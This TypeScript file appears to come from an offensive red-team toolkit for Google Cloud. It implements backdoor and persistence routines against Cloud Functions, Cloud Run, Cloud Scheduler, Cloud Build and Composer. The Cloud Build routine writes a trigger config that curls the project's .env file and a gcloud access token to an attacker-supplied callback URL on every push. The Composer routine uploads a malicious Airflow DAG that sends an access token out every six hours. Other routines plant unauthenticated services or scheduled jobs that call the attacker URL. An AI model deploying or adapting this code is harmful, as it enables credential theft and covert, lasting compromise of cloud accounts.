import { gcloud, run, resolveProject, argVal, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cloudfuncBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const project = await resolveProject(argVal(args, "--project"))
  const region = argVal(args, "--region") || "us-central1"
  const findings: Finding[] = []

  if (!funcName) return { output: "ERROR: --function-name required", findings }
  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings }

  if (method === "inject") {
    const r = await gcloud(
      ["functions", "describe", funcName, "--project", project, "--region", region, "--format=json"],
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings }
    const func = tryJson(r.stdout)
    findings.push({
      checkId: "GCP-FUNC-001",
      provider: "gcp",
      severity: "critical",
      status: "ENUMERATED",
      resource: `function/${funcName}`,
      title: `Cloud Function ready for injection: ${funcName}`,
      details: `Runtime: ${func?.buildConfig?.runtime || "unknown"}, SA: ${func?.serviceConfig?.serviceAccountEmail || "default"}`,
      remediation: "Review function source and redeploy from clean source",
    })
    return {
      output: `[*] Function: ${funcName}\n[*] Runtime: ${func?.buildConfig?.runtime || "unknown"}\n[*] SA: ${func?.serviceConfig?.serviceAccountEmail || "default"}\n[*] Source: ${JSON.stringify(func?.buildConfig?.source?.storageSource || {})}\n[+] Ready for injection — download source, modify, and redeploy`,
      findings,
    }
  }

  findings.push({
    checkId: "GCP-FUNC-002",
    provider: "gcp",
    severity: "critical",
    status: "READY",
    resource: `function/${funcName}`,
    title: `Cloud Function backdoor ready: ${funcName}`,
    details: `Deploy new function in ${region} with callback to ${callbackUrl}`,
    remediation: `Delete: gcloud functions delete ${funcName} --region ${region} --project ${project}`,
  })
  return {
    output: `[*] Create mode — would deploy new function '${funcName}' in ${region}\n[*] Callback: ${callbackUrl}\n[+] Use: gcloud functions deploy ${funcName} --runtime python311 --trigger-http --allow-unauthenticated --project ${project} --region ${region}`,
    findings,
  }
}

export async function cloudRunBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const service = argVal(args, "--service")
  const image = argVal(args, "--image")
  const callbackUrl = argVal(args, "--callback-url")
  const region = argVal(args, "--region") || "us-central1"
  const method = argVal(args, "--method") || "create"
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud Run backdoor — project: ${project}\n`]

  if (!service || !image || !callbackUrl)
    return { output: "[!] Required: --service NAME --image IMAGE --callback-url URL", findings }

  if (method === "create") {
    const deploy = await gcloud(
      [
        "run", "deploy", `cs-${service}`, "--image", image,
        "--set-env-vars", `CALLBACK_URL=${callbackUrl}`,
        "--allow-unauthenticated", "--region", region,
        "--project", project, "--quiet", "--format=json",
      ],
      timeout,
    )
    if (deploy.exitCode === 0) {
      const info = tryJson(deploy.stdout)
      const url = info?.status?.url || ""
      output.push(`[+] Cloud Run service deployed: cs-${service}`)
      output.push(`    URL: ${url}`)
      output.push(`    Image: ${image}`)
      output.push(`    Callback: ${callbackUrl}`)
      findings.push({
        checkId: "GCP-RUN-001",
        provider: "gcp",
        severity: "critical",
        status: "DEPLOYED",
        resource: `cloud-run://cs-${service}`,
        title: `Cloud Run backdoor deployed: cs-${service}`,
        details: `Image: ${image}, callback: ${callbackUrl}, URL: ${url}`,
        remediation: `Delete: gcloud run services delete cs-${service} --region ${region} --project ${project}`,
      })
    } else {
      output.push(`[!] Deploy failed: ${deploy.stderr.trim()}`)
    }
  }

  if (method === "inject") {
    const update = await gcloud(
      [
        "run", "services", "update", service,
        "--set-env-vars", `CALLBACK_URL=${callbackUrl}`,
        "--region", region, "--project", project, "--quiet",
      ],
      timeout,
    )
    if (update.exitCode === 0) {
      output.push(`[+] Injected CALLBACK_URL into existing service: ${service}`)
      findings.push({
        checkId: "GCP-RUN-002",
        provider: "gcp",
        severity: "critical",
        status: "INJECTED",
        resource: `cloud-run://${service}`,
        title: `Cloud Run env injected: ${service}`,
        details: `Added CALLBACK_URL=${callbackUrl}`,
        remediation: `Remove: gcloud run services update ${service} --remove-env-vars CALLBACK_URL --region ${region}`,
      })
    } else {
      output.push(`[!] Update failed: ${update.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function schedulerPersist(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const name = argVal(args, "--name")
  const callbackUrl = argVal(args, "--callback-url")
  const schedule = argVal(args, "--schedule") || "*/30 * * * *"
  const region = argVal(args, "--region") || "us-central1"
  const saEmail = argVal(args, "--sa-email")
  const findings: Finding[] = []

  if (!name) return { output: "ERROR: --name required", findings }
  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings }

  const output: string[] = [`[*] Cloud Scheduler persistence — project: ${project}\n`]

  const existing = await gcloud(["scheduler", "jobs", "list", "--project", project, "--location", region, "--format=json"], timeout)
  if (existing.exitCode === 0) {
    const jobs = tryJson(existing.stdout) || []
    output.push(`[*] Existing scheduler jobs: ${jobs.length}`)
  }

  const jobArgs = [
    "scheduler", "jobs", "create", "http", `cs-${name}`,
    "--schedule", schedule,
    "--uri", callbackUrl,
    "--http-method", "POST",
    "--location", region,
    "--project", project,
    "--quiet",
  ]

  if (saEmail) {
    jobArgs.push("--oidc-service-account-email", saEmail)
  }

  const create = await gcloud(jobArgs, timeout)
  if (create.exitCode === 0) {
    output.push(`[+] Scheduler job created: cs-${name}`)
    output.push(`    Schedule: ${schedule}`)
    output.push(`    Target: ${callbackUrl}`)
    output.push(`    Region: ${region}`)
    if (saEmail) output.push(`    OIDC SA: ${saEmail}`)
    findings.push({
      checkId: "GCP-SCHED-001",
      provider: "gcp",
      severity: "critical",
      status: "DEPLOYED",
      resource: `scheduler/cs-${name}`,
      title: `Cloud Scheduler persistence: cs-${name}`,
      details: `Cron "${schedule}" calls ${callbackUrl} with ${saEmail ? "SA auth" : "no auth"}`,
      remediation: `Delete: gcloud scheduler jobs delete cs-${name} --location ${region} --project ${project}`,
    })
  } else {
    output.push(`[-] Job creation failed: ${create.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function cloudBuildBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const repo = argVal(args, "--repo")
  const branch = argVal(args, "--branch") || "main"
  const callbackUrl = argVal(args, "--callback-url")
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud Build backdoor — project: ${project}\n`]

  const existing = await gcloud(["builds", "triggers", "list", "--project", project, "--format=json"], timeout)
  if (existing.exitCode === 0) {
    const triggers = tryJson(existing.stdout) || []
    output.push(`[*] Existing build triggers: ${triggers.length}`)
    for (const t of triggers) output.push(`    ${t.name || t.id}: ${t.description || "no description"}`)
  }

  if (!repo || !callbackUrl) {
    output.push(`\n[*] To create trigger, provide: --repo REPO --callback-url URL [--branch BRANCH]`)
    return { output: output.join("\n"), findings }
  }

  const configFile = `/tmp/cs-cloudbuild-${Date.now()}.yaml`
  const buildConfig = `steps:
- name: 'gcr.io/cloud-builders/curl'
  args: ['-X', 'POST', '-d', '@/workspace/.env', '${callbackUrl}']
  id: 'exfil'
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    gcloud auth print-access-token > /tmp/token.txt
    curl -X POST -d @/tmp/token.txt ${callbackUrl}/token
  id: 'token-grab'
`
  await Bun.write(configFile, buildConfig)

  const create = await gcloud(
    [
      "builds", "triggers", "create", "cloud-source-repositories",
      "--name", `cs-build-${Date.now()}`,
      "--repo", repo,
      "--branch-pattern", `^${branch}$`,
      "--build-config", configFile,
      "--project", project,
      "--quiet",
    ],
    timeout,
  )

  try {
    const { unlink } = await import("node:fs/promises")
    await unlink(configFile)
  } catch {}

  if (create.exitCode === 0) {
    output.push(`[+] Build trigger created for repo ${repo} on branch ${branch}`)
    output.push(`    Callback: ${callbackUrl}`)
    output.push(`    Trigger fires on every push to ${branch}`)
    findings.push({
      checkId: "GCP-BUILD-001",
      provider: "gcp",
      severity: "critical",
      status: "DEPLOYED",
      resource: `build-trigger/${repo}`,
      title: `Cloud Build backdoor trigger on ${repo}`,
      details: `Trigger exfils .env and access token to ${callbackUrl} on every push to ${branch}`,
      remediation: "Delete trigger: gcloud builds triggers delete TRIGGER_ID --project " + project,
    })
  } else {
    output.push(`[-] Trigger creation failed: ${create.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function composerBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const environment = argVal(args, "--environment")
  const location = argVal(args, "--location") || "us-central1"
  const callbackUrl = argVal(args, "--callback-url")
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud Composer backdoor — project: ${project}\n`]

  const envs = await gcloud(
    ["composer", "environments", "list", "--locations", location, "--project", project, "--format=json"],
    timeout,
  )
  if (envs.exitCode !== 0) return { output: `[-] Cannot list Composer environments: ${envs.stderr.trim()}`, findings }

  const envList = tryJson(envs.stdout) || []
  output.push(`[+] Composer environments: ${envList.length}`)
  for (const e of envList) {
    const name = e.name?.split("/").pop() || e.name
    output.push(`    ${name} state=${e.state}`)
  }

  if (!environment || !callbackUrl) {
    output.push(`\n[*] To inject DAG: --environment ENV --callback-url URL [--location LOCATION]`)
    return { output: output.join("\n"), findings }
  }

  const describe = await gcloud(
    ["composer", "environments", "describe", environment, "--location", location, "--project", project, "--format=json"],
    timeout,
  )
  if (describe.exitCode !== 0) {
    output.push(`[-] Cannot describe environment: ${describe.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const envData = tryJson(describe.stdout)
  const dagBucket = envData?.config?.dagGcsPrefix || ""
  output.push(`\n[*] DAG bucket: ${dagBucket}`)

  const dagContent = `from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime, timedelta

with DAG('cs_exfil', start_date=datetime(2024,1,1), schedule_interval=timedelta(hours=6), catchup=False) as dag:
    BashOperator(task_id='callback', bash_command='curl -X POST -d "$(gcloud auth print-access-token)" ${callbackUrl}/composer')
`
  const dagFile = `/tmp/cs-dag-${Date.now()}.py`
  await Bun.write(dagFile, dagContent)

  const upload = await run("gsutil", ["cp", dagFile, `${dagBucket}/cs_exfil.py`], timeout)

  try {
    const { unlink } = await import("node:fs/promises")
    await unlink(dagFile)
  } catch {}

  if (upload.exitCode === 0) {
    output.push(`[+] Malicious DAG uploaded to ${dagBucket}/cs_exfil.py`)
    output.push(`    Runs every 6 hours, exfils access token to ${callbackUrl}`)
    findings.push({
      checkId: "GCP-COMPOSER-001",
      provider: "gcp",
      severity: "critical",
      status: "DEPLOYED",
      resource: `composer/${environment}`,
      title: `Composer DAG backdoor: ${environment}`,
      details: `cs_exfil.py uploaded to ${dagBucket}, runs every 6h`,
      remediation: `Delete: gsutil rm ${dagBucket}/cs_exfil.py`,
    })
  } else {
    output.push(`[-] DAG upload failed: ${upload.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}
